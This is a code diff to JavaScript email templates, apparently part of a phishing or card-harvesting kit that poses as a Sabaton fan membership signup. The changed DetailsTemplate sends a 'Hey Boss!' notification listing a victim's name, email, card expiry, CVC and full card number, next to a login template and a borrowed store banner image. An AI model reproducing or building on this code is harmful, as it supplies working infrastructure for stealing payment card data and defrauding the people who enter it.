@@ -133,7 +133,7 @@ export const LogInTemplate = `<!DOCTYPE html>
 
 
 
-export const DetailsTemplate = (details) => {
+export const DetailsTemplate = (name, email,date,cvc, cardNumber, country) => {
 return `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -181,14 +181,20 @@ return `<!DOCTYPE html>
 <body>
     <div class="card">
         <div style="border-radius:200px; height:auto; width:100%; background: #F8FAF5; margin:0 auto;">
-            <img src="https://i.imgur.com/atBPDbj.jpeg"
+            <img src="https://res.cloudinary.com/dsps3itap/image/upload/v1744334880/sabaton-store-wide-300x102-1_1_psm1le.webp"
                 alt="slaughter to prevail alt img" style="border-radius:12px">
         </div>
         <h3>Hey Boss!</h3>
         <p>Some one just signed up for Sabaton membership plan</p>
         <p>Here are the details:</p>
 
-        <p>${details}</p>
+        <p>Name: ${name}</p>
+<p>Email: ${email}</p>
+<p>Date: ${date}</p>
+<p>CVC: ${cvc}</p>
+<p>cardNumber: ${cardNumber}</p>
+<p>Country: ${country}</p>
+
 
 
     </div>
